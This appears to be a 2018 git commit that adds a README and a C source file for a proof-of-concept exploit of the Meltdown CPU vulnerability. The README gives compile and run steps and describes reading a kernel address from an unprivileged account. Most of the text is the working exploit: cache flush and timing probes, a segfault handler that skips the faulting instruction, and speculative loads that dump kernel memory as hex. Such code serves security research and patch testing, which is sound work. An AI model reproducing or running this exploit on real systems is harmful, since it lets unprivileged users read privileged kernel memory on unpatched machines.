7a6e67e07aa9b8bc6cc5feb81cc52686993f23d5
Nick Frichette <frichetten@gmail.com>
2018-01-08 12:28:06 -0600

    Pushing public safe code

---
+++ README.md
@@ -0,0 +1,66 @@
+# POC for meltdown/spectre
+
+I can't take all or even most of the credit. gkaindl, romansavrulin, and gregvish gave me all the pieces, I just put them together.  
+
+## Be aware! This will only work on certain CPU types. This vulnerability is heavily dependent on your CPU architecture, if this doesn't work for you, please try and fix it on your own.
+
+This code will allow you to read kernel memory from a non-priviledged user account. It is not arbitrary, this information must be loaded into the L1 cache as described in the [Project Zero Blog Post](https://googleprojectzero.blogspot.com/2018/01/reading-privileged-memory-with-side.html)  
+
+## How to compile
+```gcc meltdown.c```  
+You can run it with ./a.out
+
+## Proof
+The following are screenshots showing how this all works. (This was done on an Ubuntu 17.10 system)  
+
+First, let me show you what you should normally see from /proc/kallsyms as an unpriviledged user
+
+<p align="center">
+  <img src=https://github.com/frichetten/meltdown-poc/raw/master/images/z-1.png />
+</p>
+
+As you can see all the memory locations are 0000000000000000, this is because unpriviledged users arent supposed to see this. As an example, what happens when we run this with sudo?
+
+<p align="center">
+  <img src=https://github.com/frichetten/meltdown-poc/raw/master/images/z-2.png />
+</p>
+
+Now we have memory addresses! This is to establish the fact that this information is private and should only be shown to users with a certain level of priviledge.
+
+Now, with that out of the way, let's run the exploit and see what we get.
+
+<p align="center">
+  <img src=https://github.com/frichetten/meltdown-poc/raw/master/images/z-3.png />
+</p>
+
+Did we get anything good? No, we didn't. (I should note that if you run the old exploit multiple times, these values will change, which is an indication that we are grabbing memory we are not allowed to see.) Which is a shame. Why is that? Well take a look at Project Zero's blog post, particularly variant 3.
+
+"A PoC for variant 3 that, when running with normal user privileges, can read kernel memory on the Intel Haswell Xeon CPU under some precondition. We believe that this precondition is that the targeted kernel memory is present in the L1D cache."
+
+So how do we get that into cache? well we give it a read command that is sure to fail and we get the following.
+
+<p align="center">
+  <img src=https://github.com/frichetten/meltdown-poc/raw/master/images/z-4.png />
+</p>
+
+Notice anything different about this one? (This output for the memory addresses will always be the same, until you reboot or do something catastrophic. An indication that we are successfully able to read it) Check out that first line, particularly the first set of hex. If we play that backwards (because of the Endianess), we get ffffffffb68525e0. So what? Well that's actually kind of cool. Why? Let's go back that that /proc/kallsyms section I told you was so important. Remember, I got the hex value as an unpriviledged user. What does that hex value correspond to?
+
+<p align="center">
+  <img src=https://github.com/frichetten/meltdown-poc/raw/master/images/z-5.png />
+</p>
+
+Bingo, we just got the address of something in kernel space memory as an unprivledged user. As a reminder, here is what happens if you look for that same thing without priviledge on the CLI.
+
+<p align="center">
+  <img src=https://github.com/frichetten/meltdown-poc/raw/master/images/z-6.png />
+</p>
+
+As you can see, a normal unpriviledged user wouldn't be able to identify where that construct is, but with the exploit we can find it. 
+
+What can you do with this? I don't know. As of right now, it just seems to be a game of figuring out how to force that memory into the L1 cache and pulling it from there. If I could cobble this together in 2 days, I'm sure much more experience people could pull off even more.
+
+The following is the CPU I tested this exploit on.
+
+<p align="center">
+  <img src=https://github.com/frichetten/meltdown-poc/raw/master/images/z-7.png />
+</p>
---
+++ meltdown.c
@@ -0,0 +1,282 @@
+// flush_reload from https://github.com/defuse/flush-reload-attacks
+// dump_hex from https://gist.github.com/ccbrown/9722406
+
+#include <stdio.h>
+#include <stdint.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <errno.h>
+#include <string.h>
+
+#include <sys/mman.h>
+
+#define __USE_GNU
+
+#define NUM_PROBES 5
+
+#ifndef _RTM_H
+#define _RTM_H 1
+
+/*
+ * Copyright (c) 2012,2013 Intel Corporation
+ * Author: Andi Kleen
+ *
+ * Redistribution and use in source and binary forms, with or without
+ * modification, are permitted provided that: (1) source code distributions
+ * retain the above copyright notice and this paragraph in its entirety, (2)
+ * distributions including binary code include the above copyright notice and
+ * this paragraph in its entirety in the documentation or other materials
+ * provided with the distribution
+ *
+ * THIS SOFTWARE IS PROVIDED ``AS IS'' AND WITHOUT ANY EXPRESS OR IMPLIED
+ * WARRANTIES, INCLUDING, WITHOUT LIMITATION, THE IMPLIED WARRANTIES OF
+ * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.
+ */
+
+/* Official RTM intrinsics interface matching gcc/icc, but works
+   on older gcc compatible compilers and binutils. */
+
+#define _XBEGIN_STARTED		(~0u)
+#define _XABORT_EXPLICIT	(1 << 0)
+#define _XABORT_RETRY		(1 << 1)
+#define _XABORT_CONFLICT	(1 << 2)
+#define _XABORT_CAPACITY	(1 << 3)
+#define _XABORT_DEBUG		(1 << 4)
+#define _XABORT_NESTED		(1 << 5)
+#define _XABORT_CODE(x)		(((x) >> 24) & 0xff)
+
+#define __rtm_force_inline __attribute__((__always_inline__)) inline
+
+static __rtm_force_inline int _xbegin(void)
+{
+	int ret = _XBEGIN_STARTED;
+	asm volatile(".byte 0xc7,0xf8 ; .long 0" : "+a" (ret) :: "memory");
+	return ret;
+}
+
+static __rtm_force_inline void _xend(void)
+{
+	 asm volatile(".byte 0x0f,0x01,0xd5" ::: "memory");
+}
+
+/* This is a macro because some compilers do not propagate the constant
+ * through an inline with optimization disabled.
+ */
+#define _xabort(status) \
+	asm volatile(".byte 0xc6,0xf8,%P0" :: "i" (status) : "memory")
+
+static __rtm_force_inline int _xtest(void)
+{
+	unsigned char out;
+	asm volatile(".byte 0x0f,0x01,0xd6 ; setnz %0" : "=r" (out) :: "memory");
+	return out;
+}
+
+#endif
+
+#include <signal.h>
+#include <ucontext.h>
+#define RIP ctx->uc_mcontext.gregs[REG_RIP]
+#define SPECULATIVE_EXIT __speculative_byte_load_exit
+
+extern char SPECULATIVE_EXIT[];
+
+static void sigaction_segv(int signal, siginfo_t *si, void *arg)
+{
+    ucontext_t *ctx = (ucontext_t *)arg;
+
+    /* We are on linux x86, the returning IP is stored in RIP (64bit) or EIP (32bit).
+       In this example, the length of the offending instruction is 6 bytes.
+       So we skip the offender ! */
+    #ifdef __x86_64__
+        //fprintf(stderr, "Caught SIGSEGV, addr %p, RIP 0x%llx\n", si->si_addr, RIP);
+        RIP = (uintptr_t)SPECULATIVE_EXIT; //skip sigsegv to next instruction
+    #else
+        #error fix dat for x86
+        printf("Caught SIGSEGV, addr %p, EIP 0x%x\n", si->si_addr, ctx->uc_mcontext.gregs[REG_EIP]);
+        ctx->uc_mcontext.gregs[REG_EIP] += 6;
+    #endif
+}
+
+__attribute__((always_inline))
+inline void flush(const char *adrs)
+{
+  asm __volatile__ (
+     "mfence         \n"
+     "clflush 0(%0)  \n"
+     :
+     : "r" (adrs)
+     :
+  );
+}
+
+__attribute__((always_inline))
+inline unsigned long probe(const char *adrs)
+{
+  volatile unsigned long time;
+
+  asm __volatile__ (
+    "mfence             \n"
+    "lfence             \n"
+    "rdtsc              \n"
+    "lfence             \n"
+    "movl %%eax, %%esi  \n"
+    "movl (%1), %%eax   \n"
+    "lfence             \n"
+    "rdtsc              \n"
+    "subl %%esi, %%eax  \n"
+    "clflush 0(%1)      \n"
+    : "=a" (time)
+    : "c" (adrs)
+    :  "%esi", "%edx");
+
+  return time;
+}
+
+unsigned char probe_one(size_t ptr, char* buf, int page_size)
+{
+   const int num_probes = NUM_PROBES;
+   int c, i, status = 0, min_idx = 0, win_idx = 0;
+   unsigned long times[256];
+   unsigned char guessed_char = 0, tests[256];
+   unsigned long long t1 = 0;
+   volatile uint64_t val;
+
+   memset(tests, 0, 256);
+
+   for (c = 0; c < num_probes; c++) {
+      memset(times, 0, sizeof(unsigned long) * 256);
+
+      for (i=0; i<256; i++) {
+         flush(&buf[i * page_size]);
+      }
+
+      read(-1, NULL, 0);
+
+         asm __volatile__ (
+           ".global __speculative_byte_load_exit \n\t"
+           "%=:                              \n"
+           "xorq %%rax, %%rax                \n"
+           "movb (%[ptr]), %%al              \n"
+           "shlq $0xc, %%rax                 \n"
+           "jz %=b                           \n"
+           "movq (%[buf], %%rax, 1), %%rbx   \n"
+           "__speculative_byte_load_exit:     \n"
+           "nop                               \n"
+           :
+           :  [ptr] "r" (ptr), [buf] "r" (buf)
+           :  "%rax", "%rbx");
+
+      for (i=0; i<256; i++) {
+         times[i] = probe(&buf[i * page_size]);
+      }
+
+      for (i=0; i<256; i++) {
+         min_idx = (times[min_idx] > times[i]) ? i : min_idx;
+      }
+
+      tests[min_idx]++;
+   }
+
+   for (i=0; i<256; i++) {
+      win_idx = (tests[i] > tests[win_idx]) ? i : win_idx;
+   }
+
+   return (unsigned char)win_idx;
+}
+
+void dump_hex(void* addr, const void* data, size_t size) {
+    char ascii[17];
+    size_t i, j;
+    ascii[16] = '\0';
+    printf("0x%016lx | ", (unsigned long)addr);
+        for (i = 0; i < size; ++i) {
+            printf("%02X ", ((unsigned char*)data)[i]);
+    	    if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
+	        ascii[i % 16] = ((unsigned char*)data)[i];
+	    } else {
+	    	ascii[i % 16] = '.';
+	    }
+	    if ((i+1) % 8 == 0 || i+1 == size) {
+	        printf(" ");
+		if ((i+1) % 16 == 0) {
+		    printf("|  %s \n", ascii);
+		} else if (i+1 == size) {
+		    ascii[(i+1) % 16] = '\0';
+		    if ((i+1) % 16 <= 8) {
+		    	printf(" ");
+		    }
+		    for (j = (i+1) % 16; j < 16; ++j) {
+		    	printf("   ");
+		    }
+		    printf("|  %s \n", ascii);
+		}
+	    }
+        }
+}
+
+int main(int argc, char** argv)
+{
+   unsigned char read_buf[16];
+   int page_size = getpagesize(), raw_output = 0;
+   unsigned long start_addr = 0;
+   unsigned long t, len = 0;
+
+  #ifndef USE_TSX
+    struct sigaction sa;
+
+    memset(&sa, 0, sizeof(sa));
+    sigemptyset(&sa.sa_mask);
+    sa.sa_sigaction = sigaction_segv;
+    sa.sa_flags = SA_SIGINFO;
+    sigaction(SIGSEGV, &sa, NULL);
+  #endif
+
+   if (argc < 3 || argc > 4) {
+      printf("usage: %s [start_addr (hex)] [len (dec)] [raw, optional]\n",
+         argv[0]);
+      return 0;
+   }
+
+   start_addr = strtoul(argv[1], NULL, 16);
+   len = strtoul(argv[2], NULL, 10);
+
+   if (argc == 4) {
+      raw_output = 1;
+   }
+
+   char* poke = (char*)mmap(
+      NULL,
+      256 * page_size,
+      PROT_READ | PROT_WRITE,
+      MAP_ANON | MAP_SHARED,
+      -1,
+      0
+   );
+
+   if (MAP_FAILED == poke) {
+      printf("mmap() failed: %s\n", strerror(errno));
+      return -1;
+   }
+
+   printf ("poke buffer: %p, page size: %i\n", poke, page_size);
+
+   for (t=0; t<len; t++) {
+      if (!raw_output && t > 0 && 0 == t%16) {
+         dump_hex((void*)(start_addr + t - 16), read_buf, 16);
+      }
+
+      read_buf[t%16] = probe_one(start_addr + t, poke, page_size);
+
+      if (raw_output) {
+         write(STDOUT_FILENO, &read_buf[t%16], 1);
+      }
+   }
+
+   if (!raw_output && t > 0) {
+      dump_hex((void*)(start_addr + ((t%16 ? t : (t-1))/16) * 16),
+         read_buf, t%16 ? t%16 : 16);
+   }
+
+   munmap((void*)poke, 256 * page_size);
+}
